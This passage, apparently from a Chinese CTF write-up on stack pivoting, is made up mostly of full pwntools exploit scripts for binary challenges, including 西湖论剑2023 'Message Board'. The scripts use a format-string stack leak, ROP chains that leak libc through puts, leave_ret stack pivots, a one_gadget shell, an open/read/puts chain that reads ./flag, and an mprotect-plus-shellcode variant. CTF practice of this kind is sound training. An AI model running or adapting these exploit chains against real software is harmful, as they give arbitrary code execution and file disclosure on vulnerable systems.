    import time
    context.os = 'linux'
    context.arch = 'amd64'
    #context.arch = 'i386'
    context.log_level = "debug"
    name = './pwn'
    debug = 0
    if debug:
        p = remote('node.yuzhian.com.cn',30686)
    else:
        p = process(name)
    elf = ELF(name)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    context.terminal = ['gnome-terminal','-x','sh','-c']
    s       = lambda data               :p.send(str(data))
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(str(data))
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data               :u32(data.ljust(4,'\x00'))
    uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    bss6 = elf.bss() + 0x600
    li('bss = '+hex(bss6))
    ret = 0x000000000040101a 
    rdi = 0x00000000004013d3
    leave_ret = 0x00000000004012d6
    ret = 0x000000000040101a
    sla('num:\n','286129175')
    ru('gift:')
    stack = int(p.recv(14),16) 
    li(hex(stack))
    main = 0x4012D8
    back = 0x40129B
    read = 0x4012BA
    sys = 0x4010D4
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    pl = b'a'*0x20+p64(stack)+p64(read) #1
    p.send(pl)
    pl = b'a'*0x20+p64(stack+0x20)+p64(read) #2
    p.send(pl)
    '''
    pl = p64(bss6+0x20+0x10)+p64(ret)+p64(rdi)+b"/bin/sh"+p64(sys)
    '''
    pl = p64(stack+0x20+0x10)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main) #3 
    p.send(pl)
    p.recv()
    #libc_base = uu64(r(14))-libc.sym['puts']
    libc_base = uu64(r(14))-0xa000000000000 -libc.sym['puts']
    li(hex(libc_base))
    system= libc_base + libc.sym['system'] 
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    sla('num:\n','286129175')
    p.recvuntil('Success!!!\n')
    ru('gift:')
    stack0 = int(p.recv(14),16) 
    pl = b'a'*0x20+p64(stack0)+p64(read) #4
    p.send(pl)
    pl = b'a'*0x20+p64(stack0+0x20)+p64(read) #5
    p.send(pl)
    r12 = 0x000000000002f709+libc_base
    og = libc_base + 0xe3afe
    pl =  p64(0) +  p64(r12)+ p64(0) +p64(og) #p64(ret)+p64(rdi)+p64(bin_sh)+p64(system) #5 
    #dbg()
    p.send(pl)
    itr()
直接套模板相对繁琐，实际做题还是要学会根据程序的漏洞巧妙的进行栈迁移
‍
#### 西湖论剑2023 Message Board
​​
​​
格式字符串漏洞获取栈地址，下一处读入利用栈地址获取libc基址
    payload = p64(stack_addr+0xb0+0x28) #rbp
    payload += p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(0x401378) 
    payload = payload.ljust(0xb0,b'\0')
    payload+= p64(stack_addr)+p64(0x4012e0)
    p.send(payload)
两次leave_ret将rsp矫正
​​
​​
**orw：**
布置为stack_addr+0x28-8，执行orw
    payload = p64(stack_addr+0xb0+0x28) 
    payload += p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(0x401378) 
    payload = payload.ljust(0xb0,b'\0')
    payload+= p64(stack_addr)+p64(0x4012e0)
    p.send(payload)
​​
    orw = p64(pop_rdi)+p64(stack_addr+0xd0)+p64(pop_rsi)+p64(0)+p64(open_addr)
    #open(stack_addr+0xd0,0)
    orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(elf.bss()+0x800)+p64(pop_rdx)+p64(0x50)+p64(elf.plt["read"])
    #read(3,elf.bss()+0x800,0x50)
    orw += p64(pop_rdi)+p64(elf.bss()+0x800)+p64(elf.plt["puts"])
    #puts(elf.bss()+0x800)
    orw = orw.ljust(0xa8,b'\0')+b'./flag\x00\x00'
    orw+= p64(stack_addr+0x28-8)+p64(0x4012e0)
    p.send(orw)
​​
exp：
    #encoding = utf-8
    from pwn import *
    from pwnlib.rop import *
    from pwnlib.context import *
    from pwnlib.fmtstr import *
    from pwnlib.util.packing import *
    from pwnlib.gdb import *
    from ctypes import *
    import os
    import sys
    import time
    import base64
    #from ae64 import AE64
    #from LibcSearcher import * 
    context.os = 'linux'
    context.arch = 'amd64'
    #context.arch = 'i386'
    context.log_level = "debug"
    name = './pwn'
    debug = 0
    if debug:
        p = remote('tcp.cloud.dasctf.com',23820)
    else:
        p = process(name)
    libcso = './libc.so.6'
    #libcso = './libc-2.31.so'
    libc = ELF(libcso)
    #libc = elf.libc
    elf = ELF(name)
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    bss = elf.bss()-0x80
    bss4=bss+0x400
    li(hex(bss4))
    pop_rdi=0x401413
    ret=0x40101a
    leave=0x4012e0
    read=0x401378
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']
    ru('name:\n')
    sl('%28$p')
    ru('Hello, ')
    stack_addr = int(p.recv(14),16)-0x1a0 
    li('stack_addr = '+hex(stack_addr))
    ru(b'Now, please say something to DASCTF:\n')
    payload = p64(stack_addr+0xb0+0x28) 
    payload += p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(0x401378) 
    payload = payload.ljust(0xb0,b'\0')
    payload += p64(stack_addr)+p64(0x4012e0)
    p.send(payload)
    libc_base=l64()-libc.sym['puts']
    li('libc_base = '+hex(libc_base))
    pop_rsi = libc_base+0x000000000002601f 
    pop_rdx = libc_base+0x0000000000142c92
    open_addr = libc_base + libc.sym['open']
    read_addr = libc_base + libc.sym['read']
    puts_addr = libc_base + libc.sym['puts']
    orw = p64(pop_rdi)+p64(stack_addr+0xd0)+p64(pop_rsi)+p64(0)+p64(open_addr)
    #open('./flag\x00\x00',0)
    orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(elf.bss()+0x800)+p64(pop_rdx)+p64(0x50)+p64(elf.plt["read"])
    #read(3,elf.bss()+0x800,0x50)
    orw += p64(pop_rdi)+p64(elf.bss()+0x800)+p64(elf.plt["puts"])
    #puts(elf.bss()+0x800)
    orw = orw.ljust(0xa8,b'\0')+b'./flag\x00\x00'
    orw+= p64(stack_addr+0x28-8)+p64(0x4012e0)
    p.send(orw)
    itr()
**另一种解法mproetct+shellcode：**
    mp = p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx)+p64(7)+p64(mproetct)
    #mproetct(bss,0x1000,7)
    mp += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss+0x600)+p64(pop_rdx)+p64(0x300)+p64(elf.plt["read"])
    #read(0,bss+0x600,0x300)
    mp += p64(bss+0x600)
    #shellcode
    mp = mp.ljust(0xb0,b'\0')
    mp += p64(stack_addr+0x28-8)+p64(0x4012e0)
    p.send(mp)
    ru(b'Posted Successfully~\n')
    sc = asm(shellcraft.cat(b"./flag"))
    p.send(sc)
‍